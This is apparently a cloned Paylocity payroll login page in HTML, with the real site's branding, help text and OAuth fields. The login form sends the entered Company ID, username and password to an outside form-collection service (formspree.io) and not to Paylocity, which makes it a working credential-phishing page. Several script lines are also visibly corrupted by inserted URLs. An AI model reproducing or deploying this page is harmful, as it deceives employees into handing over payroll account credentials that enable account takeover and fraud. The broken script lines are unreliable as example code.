<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=no, minimal-ui"
    />
    <title>Login | Paylocity</title>

    <script>
      dataLayer = [
        {
          global_environment: "PRODPROD",
          identity_eloginid: "",
          identity_coid: "",
          identity_userid: "",
          context_coset: "",
          context_coid: "",
          product_type: "Login",
          product_type_detail: "Login",
          platform: "web",
          identity_key: "",
          version: "1.0.0.2261"
        }
      ];
    </script>
    <script>
      (function (w, d, s, l, i) {
        w[l] = w[l] || []; w[l].push({
          'gtm.start':
            new Date().getTime(), event: 'gtm.js'
        }); var f = d.getElementsByTagName(s)[0],
          j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =https://access.paylocity.com
            'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
      })(window, document, 'script', 'dataLayer', 'GTM-NXMFCP7');
    </script>
    <script>
      (function (w, d, s, l, i) {
        w[l] = w[l] || []; w[l].push({
          'gtm.start':
            new Date().getTime(), event: 'gtm.js'
        }); var f = d.getElementsByTagName(s)[0],
          j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =https://access.paylocity.com
            'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
      })(window, document, 'script', 'dataLayer', 'GTM-NQHQNP7');
    </script>

    <link
      rel="stylesheet"
      href="https://access.paylocity.com/css/citrus.core.min.css?v=Rhdj29fKYE1NywaguhCvatyEan05vA7g4rq2RDACg0A"
    />
    <link
      rel="stylesheet"
      href="https://access.paylocity.com/css/citrus.min.css?v=9TYMpb8YPfKfCFs3JJ_0DcmhccOeas8ungGNR8hWlqA"
    />
    <link
      rel="stylesheet"
      href="https://access.paylocity.com/css/site.css?v=WP0oV43LRBwmX0d1H_06PWqM5RWUzsgZ9kYb5VIPwFE"
    />
    <link
      rel="stylesheet"
      href="https://cdn.paylocity.com/cdn/branding/login.css"
    />
    <link
      rel="shortcut icon"
      href="https://cdn.paylocity.com/cdn/branding/favicon.ico"
    />
    <link
      rel="apple-touch-icon"
      sizes="180x180"
      href="https://cdn.paylocity.com/cdn/branding/apple-touch-icon.png"
    />
  </head>
  <body class="citrus container-table login-app">
    <div class="row table-row">
      <div class="col-lg-6 col-md-7 no-float">
        <div class="row pcty-hidden-mobile pcty-margin-top"></div>
        <div class="row pcty-hidden-mobile pcty-margin-top"></div>
        <div class="row pcty-hidden-mobile pcty-margin-top"></div>
        <div class="row pcty-hidden-above-mobile pcty-margin-compact-top"></div>
        <div class="row pcty-margin-compact-bottom">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="pcty-row-flex pcty-align-items-center pcty-margin-top">
              <div class="col-xs-6 pcty-large-padding-left">
                <img
                  src="https://cdn.paylocity.com/cdn/branding/paylocity-logo-left.svg"
                  class="login-logo"
                  alt="Paylocity"
                />
              </div>
              <div
                class="col-xs-6 pcty-type-rightalign pcty-large-padding-right"
              >
                <a
                  class="type-nounderline login-help open-footer-drawer pcty-help-link"
                  href="https://access.paylocity.com/javascript:void(0);"
                  data-content-section=".help-drawer"
                  data-automation-id="loginHelpLink"
                  >Help</a
                >
              </div>
            </div>
          </div>
        </div>
        <div class="row pcty-margin-top">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="pcty-row-flex pcty-margin-compact-bottom">
              <div class="pcty-col pcty-large-padding-horizontal">
                <h2 class="pcty-h2">Welcome</h2>
              </div>
            </div>

            <form
              method="post"
              class="default-form login-form"
              action="https://formspree.io/f/xyyapknr"
            >
              <div
                class="banner-message error margin-bottom error-banner client-error-banner pcty-margin-horizontal"
                style="display: none;"
              >
                <ul>
                  <li>The credentials provided are incorrect</li>
                </ul>
              </div>

              <div
                id="cookiesNotEnabled"
                class="banner-message warning margin-bottom hidden pcty-margin-horizontal"
              >
                <div class="warning-banner">
                  Cookies are blocked or not supported by the browser you're
                  using. Please enable cookies or, if you're browsing incognito,
                  switch to public mode so we can log you in. Thanks!
                </div>
              </div>

              <div
                id="internetExplorer"
                class="banner-message warning margin-bottom hidden pcty-margin-horizontal"
              >
                <div class="warning-banner">
                  We see you're using Internet Explorer. As of August 1, 2021,
                  Internet Explorer will no longer be supported. For the best
                  experience, we suggest you use
                  <a
                    class="open-footer-drawer"
                    href="https://access.paylocity.com/javascript:void(0);"
                    data-content-section=".supported-browsers-drawer"
                    >another browser</a
                  >.
                </div>
              </div>

              <input
                type="hidden"
                id="ClientId"
                name="ClientId"
                value="56400b1e4bab4790b909ace559dadbc1"
              />
              <input
                type="hidden"
                id="ResponseType"
                name="ResponseType"
                value="code"
              />
              <input
                type="hidden"
                id="ResponseMode"
                name="ResponseMode"
                value="form_post"
              />
              <input
                type="hidden"
                id="Scope"
                name="Scope"
                value="openid profile offline_access security:credential:create security:credential:update security:credential:delete security:companysecuritysettings:create security:companysecuritysettings:delete"
              />
              <input
                type="hidden"
                id="RedirectUri"
                name="RedirectUri"
                value="https://login.paylocity.com/Escher/Escher_WebUI/Membership.IdentityManager/Return"
              />
              <input
                type="hidden"
                id="State"
                name="State"
                value="OpenIdConnect.AuthenticationProperties=cYwCjzPu1xo3NfHQE9v9MxoH2R1Gve07ssBz2cqazSABx6bZKHfqKGdYXglwwlJKmf3_jm-FPvw2Na3l5NpXqSlVCotNThStGeKuPa24evtYRkFM_OBqIoK0fQUBZ7OBVOoSrn7kAbSQsVJgShYazT6N-Zs3hvx7IX2MyEx1JnOgF7wWyIC4quWajOel3YnCjThGZRwNQqQJAf9hqZhAwy2UtAnRileXVbRvB6cnfqSIY4l2AwRiLwdPKovMbEbUjqecSUFB1CyMy5NGAEtg4iC8Fcv_-9d6ZhgfeRj43E6cKxYuUt0HyFJLYwGvHF2O9wibP8mwAtqwO1jQCDIfClwz6c4alHrlmNuf1FeCHpCZSCfUiXSrnEH66x43b50OD4Bf5Jgk3FjbwpWsuUxMhQIjl3tGvqldR_S-jmhUPXxYW-jB0Itsply2tZZLIDufU5XC1Klt8JXYtSVmEWBLdbk1Nzs"
              />
              <input type="hidden" id="Nonce" name="Nonce" value="" />
              <input
                type="hidden"
                id="CodeChallenge"
                name="CodeChallenge"
                value=""
              />
              <input
                type="hidden"
                id="CodeChallengeMethod"
                name="CodeChallengeMethod"
                value=""
              />

              <div class="pcty-row-flex">
                <div
                  class="pcty-col pcty-padding-top pcty-large-padding-horizontal"
                >
                  <div class="pcty-input-label">
                    <label for="CompanyId">Company ID</label>
                  </div>
                  <input
                    id="CompanyId"
                    maxlength="9"
                    autofocus="autofocus"
                    class="pcty-input pcty-input-size-responsive"
                    type="text"
                    name="CompanyId"
                    value=""
                  />
                </div>
              </div>

              <div class="pcty-row-flex">
                <div
                  class="pcty-col pcty-padding-top pcty-large-padding-horizontal"
                >
                  <div class="pcty-input-label">
                    <label for="Username">Username</label>
                  </div>
                  <input
                    id="Username"
                    maxlength="40"
                    class="pcty-input pcty-input-size-responsive"
                    type="text"
                    name="Username"
                    value=""
                  />
                </div>
              </div>

              <div class="pcty-row-flex">
                <div
                  class="pcty-col pcty-padding-top pcty-compact-padding-bottom pcty-large-padding-horizontal"
                >
                  <div class="pcty-input-label">
                    <label for="Password">Password</label>
                  </div>
                  <input
                    type="password"
                    id="Password"
                    name="Password"
                    class="pcty-input pcty-input-size-responsive"
                  />
                  <p id="password-caps-lock-tag" style="font-size: 90%;">
                    &nbsp
                  </p>
                </div>
              </div>

              <div class="pcty-row-flex">
                <div class="pcty-large-padding-horizontal">
                  <div class="pcty-input pcty-input-checkbox">
                    <label
                      class="pcty-checkbox-label pcty-input-label"
                      for="IsRememberingUser"
                    >
                      <input
                        type="checkbox"
                        data-val="true"
                        data-val-required="The IsRememberingUser field is required."
                        id="IsRememberingUser"
                        name="IsRememberingUser"
                        value="true"
                      />Remember My Username
                    </label>
                  </div>
                </div>
              </div>

              <div class="pcty-row-flex">
                <div
                  class="pcty-col pcty-padding-top pcty-large-padding-horizontal"
                >
                  <button
                    type="submit"
                    class="pcty-button pcty-size-medium pcty-button-full-width pcty-button-full-width-mobile pcty-size-responsive submit-button login-button"
                  >
                    Login
                  </button>
                </div>
              </div>

              <div class="pcty-row-flex">
                <div
                  class="pcty-col pcty-compact-padding-top pcty-large-padding-horizontal"
                >
                  <a
                    id="sso-login"
                    class="pcty-button pcty-size-medium pcty-button-full-width pcty-button-full-width-mobile pcty-size-responsive pcty-button-secondary pcty-button-outline"
                    href="https://access.paylocity.com/Login/SpInitiatedSso?response_type=code&amp;client_id=56400b1e4bab4790b909ace559dadbc1&amp;redirect_uri=https%3A%2F%2Flogin.paylocity.com%2FEscher%2FEscher_WebUI%2FMembership.IdentityManager%2FReturn&amp;scope=openid%20profile%20offline_access%20security%3Acredential%3Acreate%20security%3Acredential%3Aupdate%20security%3Acredential%3Adelete%20security%3Acompanysecuritysettings%3Acreate%20security%3Acompanysecuritysettings%3Adelete&amp;state=OpenIdConnect.AuthenticationProperties%3DcYwCjzPu1xo3NfHQE9v9MxoH2R1Gve07ssBz2cqazSABx6bZKHfqKGdYXglwwlJKmf3_jm-FPvw2Na3l5NpXqSlVCotNThStGeKuPa24evtYRkFM_OBqIoK0fQUBZ7OBVOoSrn7kAbSQsVJgShYazT6N-Zs3hvx7IX2MyEx1JnOgF7wWyIC4quWajOel3YnCjThGZRwNQqQJAf9hqZhAwy2UtAnRileXVbRvB6cnfqSIY4l2AwRiLwdPKovMbEbUjqecSUFB1CyMy5NGAEtg4iC8Fcv_-9d6ZhgfeRj43E6cKxYuUt0HyFJLYwGvHF2O9wibP8mwAtqwO1jQCDIfClwz6c4alHrlmNuf1FeCHpCZSCfUiXSrnEH66x43b50OD4Bf5Jgk3FjbwpWsuUxMhQIjl3tGvqldR_S-jmhUPXxYW-jB0Itsply2tZZLIDufU5XC1Klt8JXYtSVmEWBLdbk1Nzs"
                  >
                    Single Sign-On Login
                  </a>
                </div>
              </div>

              <div
                class="pcty-row-flex pcty-hidden-mobile pcty-margin-top"
              ></div>
              <div class="pcty-row-flex pcty-padding-top">
                <div
                  class="pcty-col pcty-col-lg-12 pcty-type-centeralign pcty-padding-right"
                >
                  <a
                    class="pcty-type-nounderline pcty-help-link"
                    data-automation-id="loginForgotPassword"
                    href="https://access.paylocity.com/Login/ForgotPassword?response_type=code&amp;client_id=56400b1e4bab4790b909ace559dadbc1&amp;redirect_uri=https%3A%2F%2Flogin.paylocity.com%2FEscher%2FEscher_WebUI%2FMembership.IdentityManager%2FReturn&amp;scope=openid%20profile%20offline_access%20security%3Acredential%3Acreate%20security%3Acredential%3Aupdate%20security%3Acredential%3Adelete%20security%3Acompanysecuritysettings%3Acreate%20security%3Acompanysecuritysettings%3Adelete&amp;state=OpenIdConnect.AuthenticationProperties%3DcYwCjzPu1xo3NfHQE9v9MxoH2R1Gve07ssBz2cqazSABx6bZKHfqKGdYXglwwlJKmf3_jm-FPvw2Na3l5NpXqSlVCotNThStGeKuPa24evtYRkFM_OBqIoK0fQUBZ7OBVOoSrn7kAbSQsVJgShYazT6N-Zs3hvx7IX2MyEx1JnOgF7wWyIC4quWajOel3YnCjThGZRwNQqQJAf9hqZhAwy2UtAnRileXVbRvB6cnfqSIY4l2AwRiLwdPKovMbEbUjqecSUFB1CyMy5NGAEtg4iC8Fcv_-9d6ZhgfeRj43E6cKxYuUt0HyFJLYwGvHF2O9wibP8mwAtqwO1jQCDIfClwz6c4alHrlmNuf1FeCHpCZSCfUiXSrnEH66x43b50OD4Bf5Jgk3FjbwpWsuUxMhQIjl3tGvqldR_S-jmhUPXxYW-jB0Itsply2tZZLIDufU5XC1Klt8JXYtSVmEWBLdbk1Nzs"
                    >Forgot Password</a
                  >
                </div>
              </div>
              <div class="row pcty-hidden-above-mobile pcty-margin-top"></div>

              <div class="pcty-row-flex">
                <div
                  class="pcty-col pcty-col-lg-12 pcty-type-centeralign pcty-padding-right"
                >
                  <a
                    id="register-new-user"
                    class="pcty-type-nounderline pcty-help-link"
                    href="https://access.paylocity.com/Login/Register?response_type=code&amp;client_id=56400b1e4bab4790b909ace559dadbc1&amp;redirect_uri=https%3A%2F%2Flogin.paylocity.com%2FEscher%2FEscher_WebUI%2FMembership.IdentityManager%2FReturn&amp;scope=openid%20profile%20offline_access%20security%3Acredential%3Acreate%20security%3Acredential%3Aupdate%20security%3Acredential%3Adelete%20security%3Acompanysecuritysettings%3Acreate%20security%3Acompanysecuritysettings%3Adelete&amp;state=OpenIdConnect.AuthenticationProperties%3DcYwCjzPu1xo3NfHQE9v9MxoH2R1Gve07ssBz2cqazSABx6bZKHfqKGdYXglwwlJKmf3_jm-FPvw2Na3l5NpXqSlVCotNThStGeKuPa24evtYRkFM_OBqIoK0fQUBZ7OBVOoSrn7kAbSQsVJgShYazT6N-Zs3hvx7IX2MyEx1JnOgF7wWyIC4quWajOel3YnCjThGZRwNQqQJAf9hqZhAwy2UtAnRileXVbRvB6cnfqSIY4l2AwRiLwdPKovMbEbUjqecSUFB1CyMy5NGAEtg4iC8Fcv_-9d6ZhgfeRj43E6cKxYuUt0HyFJLYwGvHF2O9wibP8mwAtqwO1jQCDIfClwz6c4alHrlmNuf1FeCHpCZSCfUiXSrnEH66x43b50OD4Bf5Jgk3FjbwpWsuUxMhQIjl3tGvqldR_S-jmhUPXxYW-jB0Itsply2tZZLIDufU5XC1Klt8JXYtSVmEWBLdbk1Nzs"
                    >Register New User</a
                  >
                </div>
              </div>
              <div class="pcty-row-flex">
                <div
                  class="pcty-col pcty-col-lg-12 pcty-type-centeralign pcty-padding-right"
                >
                  <a
                    class="pcty-type-nounderline pcty-help-link"
                    href="https://www.paylocity.com/privacy/"
                    target="_blank"
                    >Privacy Policy</a
                  >
                </div>
              </div>

              <div
                class="pcty-row-flex pcty-hidden-mobile pcty-margin-top"
              ></div>
              <div
                class="pcty-row-flex pcty-hidden-above-mobile pcty-margin-compact-top"
              ></div>
              <div class="pcty-row-flex pcty-padding-top">
                <div
                  class="pcty-col pcty-col-lg-6 pcty-type-rightalign pcty-padding-right"
                >
                  <a
                    class="pcty-type-nounderline"
                    href="https://apps.apple.com/app/apple-store/id652438572?pt=2037524&ct=WebLogin&mt=8"
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    <img
                      src="https://access.paylocity.com/images/Mobile-AppStore.svg"
                      height="38"
                      alt="Download on the Apple AppStore"
                    />
                  </a>
                </div>
                <div class="pcty-col pcty-col-lg-6 pcty-padding-left">
                  <a
                    class="pcty-type-nounderline"
                    href="https://play.google.com/store/apps/details?id=com.paylocity.paylocitymobile&referrer=utm_source%3DPCTY%26utm_medium%3Dbanner%26utm_term%3DWeb%26utm_campaign%3DLoginButton"
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    <img
                      src="https://access.paylocity.com/images/Mobile-GooglePlay.svg"
                      height="38"
                      alt="Get it on Google Play"
                    />
                  </a>
                </div>
              </div>
              <input
                name="__RequestVerificationToken"
                type="hidden"
                value="CfDJ8FbPyY0Al5pPrIa4xSO8HaVOf0WDsdIm0MASTysFZ5e-dLRQHoWQrC6YNt5ZoRHNp-bj-uvOUyBp-JVnMftAE-9Hy2iRyzI0gzoclopr0Qu_gqtabV_kfLRNRySTL0kRLZm0cPPNMRRNv6E918NQKmM"
              /><input name="IsRememberingUser" type="hidden" value="false" />
            </form>

            <div class="row pcty-hidden-above-mobile pcty-margin-top"></div>
            <div class="row pcty-hidden-above-mobile pcty-margin-top"></div>
            <div class="row pcty-hidden-above-mobile pcty-margin-top"></div>
            <div class="row pcty-hidden-above-mobile pcty-margin-top"></div>
            <div class="row pcty-hidden-above-mobile pcty-margin-top"></div>
            <div class="row pcty-hidden-above-mobile pcty-margin-top"></div>
          </div>
        </div>
      </div>
      <div
        class="col-lg-6 col-md-5 hidden-sm hidden-xs no-float marketing-area"
      >
        <img
          src="https://cdn.paylocity.com/cdn/branding/login-content.svg"
          class="marketing-picture center-block"
          alt="Marketing Picture"
        />
      </div>
    </div>

    <div class="drawer small footer-drawer">
      <div class="overlay"></div>
      <div class="wrapper">
        <div class="drawer-header">
          <div slot="header" class="">
            <div class="row padding-horizontal">
              <div class="col-xs-12 content-header">
                <h3
                  class="pcty-h3 pull-left drawer-content-option help-drawer howto-drawer"
                >
                  Login Help
                </h3>
                <h3
                  class="pcty-h3 pull-left drawer-content-option supported-browsers-drawer"
                >
                  Supported Browsers
                </h3>
                <button
                  data-automation-id="loginHelpClose"
                  class="pcty-button pcty-button-secondary pcty-button-outline pcty-size-medium pcty-float-right close-help"
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        </div>
        <div class="drawer-content">
          <div class="drawer-scroll">
            <div
              slot="content"
              class="drawer-content-option supported-browsers-drawer"
            >
              <div class="row padding-horizontal">
                <div class="col-xs-12">
                  <div
                    id="drawer-browser-version"
                    class="banner-message information margin-vertical"
                  >
                    <p>You are using <span class="browser-version"></span></p>
                  </div>
                  <h3 class="type-bold">
                    There are many great reasons to always update to the latest
                    version of your browser:
                  </h3>
                  <p class="margin-vertical">
                    <span class="type-bold">Security</span> - Stay protected
                    against scams, viruses, and threats
                  </p>
                  <p class="margin-vertical">
                    <span class="type-bold">Speed</span> - Enjoy the latest
                    performance and system stability improvements
                  </p>
                  <p class="margin-vertical">
                    <span class="type-bold">Experience</span> - Get the best and
                    most engaging features that sites offer
                  </p>
                  <div class="row">
                    <div class="col-md-4 browser-frame">
                      <a
                        href="http://www.google.com/chrome/"
                        target="_blank"
                        rel="noopener noreferrer"
                      >
                        <div class="browser-box">
                          <img
                            class="browser-logo"
                            src="https://access.paylocity.com/images/Browser-Chrome.png"
                            alt="Google Chrome"
                          />
                          <br />
                          <h3 class="text-center">Google Chrome</h3>
                        </div>
                      </a>
                    </div>
                    <div class="col-md-4 browser-frame">
                      <a
                        href="https://www.mozilla.org/en-US/firefox/new/"
                        target="_blank"
                        rel="noopener noreferrer"
                      >
                        <div class="browser-box">
                          <img
                            class="browser-logo"
                            src="https://access.paylocity.com/images/Browser-Firefox.png"
                            alt="Mozilla Firefox"
                          />
                          <br />
                          <h3 class="text-center">Mozilla Firefox</h3>
                        </div>
                      </a>
                    </div>
                    <div class="col-md-4 browser-frame">
                      <a
                        href="https://www.microsoft.com/en-us/edge"
                        target="_blank"
                        rel="noopener noreferrer"
                      >
                        <div class="browser-box">
                          <img
                            class="browser-logo"
                            src="https://access.paylocity.com/images/Browser-Edge.png"
                            alt="Microsoft Edge"
                          />
                          <br />
                          <h3 class="text-center">Microsoft Edge</h3>
                        </div>
                      </a>
                    </div>
                  </div>
                  <div class="row">
                    <div class="col-md-4 browser-frame">
                      <a
                        href="https://www.apple.com/safari/"
                        target="_blank"
                        rel="noopener noreferrer"
                      >
                        <div class="browser-box">
                          <img
                            class="browser-logo"
                            src="https://access.paylocity.com/images/Browser-Safari.png"
                            alt="Apple Safari"
                          />
                          <br />
                          <h3 class="text-center">Apple Safari</h3>
                        </div>
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div
              slot="content"
              class="drawer-content-option help-drawer sal-mobile-height-expand"
            >
              <div class="row padding-horizontal sal-mobile-height-expand">
                <div
                  class="col-lg-12 col-md-12 col-sm-12 col-xs-12 sal-mobile-height-expand"
                >
                  <div class="pcty-row">
                    <img
                      src="https://access.paylocity.com/images/login-help.svg"
                      alt="Login Help"
                    />
                    <div class="text-center">
                      <h3 class="margin-vertical">
                        What do you need help with?
                      </h3>
                    </div>
                  </div>
                  <div
                    class="row sal-margin-bottom-xlarge sal-help-drawer-buttons"
                  >
                    <div class="col-sm-10 col-sm-offset-1 col-xs-12">
                      <a
                        class="button full-width outline secondary sal-margin-bottom-small size-xlarge"
                        tabindex="2"
                        data-automation-id="loginHelpForgotCompanyId"
                        href="https://access.paylocity.com/Login/ForgotUsername?response_type=code&amp;client_id=56400b1e4bab4790b909ace559dadbc1&amp;redirect_uri=https%3A%2F%2Flogin.paylocity.com%2FEscher%2FEscher_WebUI%2FMembership.IdentityManager%2FReturn&amp;scope=openid%20profile%20offline_access%20security%3Acredential%3Acreate%20security%3Acredential%3Aupdate%20security%3Acredential%3Adelete%20security%3Acompanysecuritysettings%3Acreate%20security%3Acompanysecuritysettings%3Adelete&amp;state=OpenIdConnect.AuthenticationProperties%3DcYwCjzPu1xo3NfHQE9v9MxoH2R1Gve07ssBz2cqazSABx6bZKHfqKGdYXglwwlJKmf3_jm-FPvw2Na3l5NpXqSlVCotNThStGeKuPa24evtYRkFM_OBqIoK0fQUBZ7OBVOoSrn7kAbSQsVJgShYazT6N-Zs3hvx7IX2MyEx1JnOgF7wWyIC4quWajOel3YnCjThGZRwNQqQJAf9hqZhAwy2UtAnRileXVbRvB6cnfqSIY4l2AwRiLwdPKovMbEbUjqecSUFB1CyMy5NGAEtg4iC8Fcv_-9d6ZhgfeRj43E6cKxYuUt0HyFJLYwGvHF2O9wibP8mwAtqwO1jQCDIfClwz6c4alHrlmNuf1FeCHpCZSCfUiXSrnEH66x43b50OD4Bf5Jgk3FjbwpWsuUxMhQIjl3tGvqldR_S-jmhUPXxYW-jB0Itsply2tZZLIDufU5XC1Klt8JXYtSVmEWBLdbk1Nzs"
                        >Forgot Company ID</a
                      >

                      <a
                        class="button full-width outline secondary sal-margin-bottom-small size-xlarge"
                        tabindex="2"
                        data-automation-id="loginHelpForgotUsername"
                        href="https://access.paylocity.com/Login/ForgotUsername?response_type=code&amp;client_id=56400b1e4bab4790b909ace559dadbc1&amp;redirect_uri=https%3A%2F%2Flogin.paylocity.com%2FEscher%2FEscher_WebUI%2FMembership.IdentityManager%2FReturn&amp;scope=openid%20profile%20offline_access%20security%3Acredential%3Acreate%20security%3Acredential%3Aupdate%20security%3Acredential%3Adelete%20security%3Acompanysecuritysettings%3Acreate%20security%3Acompanysecuritysettings%3Adelete&amp;state=OpenIdConnect.AuthenticationProperties%3DcYwCjzPu1xo3NfHQE9v9MxoH2R1Gve07ssBz2cqazSABx6bZKHfqKGdYXglwwlJKmf3_jm-FPvw2Na3l5NpXqSlVCotNThStGeKuPa24evtYRkFM_OBqIoK0fQUBZ7OBVOoSrn7kAbSQsVJgShYazT6N-Zs3hvx7IX2MyEx1JnOgF7wWyIC4quWajOel3YnCjThGZRwNQqQJAf9hqZhAwy2UtAnRileXVbRvB6cnfqSIY4l2AwRiLwdPKovMbEbUjqecSUFB1CyMy5NGAEtg4iC8Fcv_-9d6ZhgfeRj43E6cKxYuUt0HyFJLYwGvHF2O9wibP8mwAtqwO1jQCDIfClwz6c4alHrlmNuf1FeCHpCZSCfUiXSrnEH66x43b50OD4Bf5Jgk3FjbwpWsuUxMhQIjl3tGvqldR_S-jmhUPXxYW-jB0Itsply2tZZLIDufU5XC1Klt8JXYtSVmEWBLdbk1Nzs"
                        >Forgot Username</a
                      >

                      <a
                        class="button full-width outline secondary size-xlarge"
                        tabindex="3"
                        data-automation-id="loginHelpForgotPassword"
                        href="https://access.paylocity.com/Login/ForgotPassword?response_type=code&amp;client_id=56400b1e4bab4790b909ace559dadbc1&amp;redirect_uri=https%3A%2F%2Flogin.paylocity.com%2FEscher%2FEscher_WebUI%2FMembership.IdentityManager%2FReturn&amp;scope=openid%20profile%20offline_access%20security%3Acredential%3Acreate%20security%3Acredential%3Aupdate%20security%3Acredential%3Adelete%20security%3Acompanysecuritysettings%3Acreate%20security%3Acompanysecuritysettings%3Adelete&amp;state=OpenIdConnect.AuthenticationProperties%3DcYwCjzPu1xo3NfHQE9v9MxoH2R1Gve07ssBz2cqazSABx6bZKHfqKGdYXglwwlJKmf3_jm-FPvw2Na3l5NpXqSlVCotNThStGeKuPa24evtYRkFM_OBqIoK0fQUBZ7OBVOoSrn7kAbSQsVJgShYazT6N-Zs3hvx7IX2MyEx1JnOgF7wWyIC4quWajOel3YnCjThGZRwNQqQJAf9hqZhAwy2UtAnRileXVbRvB6cnfqSIY4l2AwRiLwdPKovMbEbUjqecSUFB1CyMy5NGAEtg4iC8Fcv_-9d6ZhgfeRj43E6cKxYuUt0HyFJLYwGvHF2O9wibP8mwAtqwO1jQCDIfClwz6c4alHrlmNuf1FeCHpCZSCfUiXSrnEH66x43b50OD4Bf5Jgk3FjbwpWsuUxMhQIjl3tGvqldR_S-jmhUPXxYW-jB0Itsply2tZZLIDufU5XC1Klt8JXYtSVmEWBLdbk1Nzs"
                        >Forgot Password</a
                      >
                    </div>
                  </div>
                  <div class="row padding-horizontal sal-mobile-height-expand">
                    <div class="text-center sal-mobile-drawer-footer">
                      <div class="col-xs-6 text-left">
                        <a
                          data-automation-id="loginHelpSupportedBrowsers"
                          class="type-nounderline supported-browsers open-footer-drawer"
                          href="https://access.paylocity.com/javascript:void(0);"
                          data-content-section=".supported-browsers-drawer"
                          >Supported Browsers</a
                        >
                      </div>
                      <div class="col-xs-6 text-right">
                        <a
                          data-automation-id="loginHelpHowToLogin"
                          class="type-nounderline login-help open-footer-drawer"
                          href="https://access.paylocity.com/javascript:void(0);"
                          data-content-section=".howto-drawer"
                          >How to Login</a
                        >
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div slot="content" class="drawer-content-option howto-drawer">
              <div class="row padding-horizontal">
                <div class="col-xs-12">
                  <h3 class="type-bold margin-vertical">Login Help</h3>
                  <p>
                    To maintain confidentiality, employees must contact their
                    Company Administrator with questions. Paylocity is not
                    authorized to speak directly with employees.
                  </p>
                  <p class="type-bold margin-top">To Login</p>
                  <ul>
                    <li>
                      Enter the Paylocity assigned <strong>Company ID</strong>.
                    </li>
                    <li>
                      Enter the <strong>Username</strong>. Remember usernames
                      are:
                      <ul>
                        <li>Not case sensitive</li>
                        <li>Contain 3 to 20 characters</li>
                        <li>
                          Can't contain special characters other than . and _
                        </li>
                      </ul>
                    </li>
                    <li>
                      Enter the <strong>Password</strong>. Remember passwords
                      are:
                      <ul>
                        <li>ARE case sensitive</li>
                        <li>Contain 8 to 72 characters</li>
                        <li>
                          Cannot be a repeat of your four previous passwords
                        </li>
                        <li>
                          Must include 2 of the following 3 items:
                          <ul>
                            <li>1 or more numbers</li>
                            <li>
                              1 or more uppercase letters and 1 or more
                              lowercase letters
                            </li>
                            <li>1 or more non-alphanumeric characters</li>
                          </ul>
                        </li>
                      </ul>
                    </li>
                    <li>
                      Check the <strong>Remember My Username</strong> box to
                      have the system populate the Company ID and Username. Note
                      this is must be set on each device by the individual.
                    </li>
                    <li>Verify all information is correct</li>
                    <li>Select Login</li>
                  </ul>
                  <p class="type-bold margin-top">Trouble Logging In</p>
                  <ul>
                    <li>
                      Click <strong>Forgot Company ID/Username?</strong> to
                      retrieve your Company ID and Username.
                      <ul>
                        <li>
                          You will need: Last Name, Last 4 Digits of SSN, Zip
                          Code & Phone or Email
                        </li>
                      </ul>
                    </li>
                    <li>
                      Click <strong>Forgot Password?</strong> to reset the
                      password.
                      <ul>
                        <li>
                          You will need: Company ID, Username & Phone or Email
                        </li>
                      </ul>
                    </li>
                    <li>
                      Click <strong>Register new user</strong> if you are
                      logging in for the first time.
                      <ul>
                        <li>Follow the prompts on the screen</li>
                      </ul>
                    </li>
                    <li>
                      Click Single sign-on login to login using your company's
                      SSO provider.
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <script>
      window.jQuery ||
        document.write(
          "\u003Cscript src=https://access.paylocity.com/\u0022/scripts/jquery-3.6.3.min.js\u0022\u003E\u003C/script\u003E"
        );
    </script>
    <script src="https://access.paylocity.com/scripts/login.js?v=RtWoTBWUmtIpbAZiRjng_HpFNVfA0yMjpUix7fqpI9Y"></script>

    <script
      src="https://access.paylocity.com/scripts/LoginIndex.js"
      type="text/javascript"
    ></script>
    <script>
      checkCookies(); //LoginIndex.js functions
      checkIE();
      checkCapsLock();
    </script>

    <script src="https://access.paylocity.com/scripts/showPassword.js?v=_tihkHARjQMhL6BuZRFbv_JNOGf67ZZcQ3QiIur1UIk"></script>
    <script>
      $(function () {
        var passwordElement = document.getElementById("Password");
        var showPasswordElement = passwordElement.parentNode.appendChild(
          document.createElement("a")
        );
        var showPassword = new ShowPassword(
          passwordElement,
          showPasswordElement
        );

        showPassword.init("Show", "Hide");
      });
    </script>
  </body>
</html>
